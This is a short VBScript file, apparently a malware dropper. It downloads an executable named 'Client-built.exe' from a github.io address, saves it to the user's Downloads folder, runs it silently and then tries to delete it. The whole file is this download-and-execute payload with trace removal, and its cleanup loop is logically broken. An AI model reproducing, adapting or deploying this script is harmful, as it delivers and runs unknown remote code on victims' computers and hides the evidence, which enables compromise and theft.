Set x = CreateObject("MSXML2.XMLHTTP")
x.Open "GET", "https://homleds.github.io/Client-built.exe", False
x.Send

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
downloadsFolder = shell.SpecialFolders("MyDocuments") & "\Downloads" ' This dynamically gets the Downloads folder
tempFile = downloadsFolder & "\Client-built.exe"

' Check if Downloads folder exists, if not, exit
If Not fso.FolderExists(downloadsFolder) Then
    MsgBox "Downloads folder not found!"
    WScript.Quit
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write x.responseBody
stream.SaveToFile tempFile, 2 ' Save file (overwrite if it exists)
stream.Close

' Run the downloaded executable
CreateObject("WScript.Shell").Run tempFile

' Delete the file after execution
Set fso = CreateObject("Scripting.FileSystemObject")
Do While fso.FileExists(tempFile)
    WScript.Sleep 1000 ' Wait for the file to finish execution before deleting
Loop
fso.DeleteFile tempFile
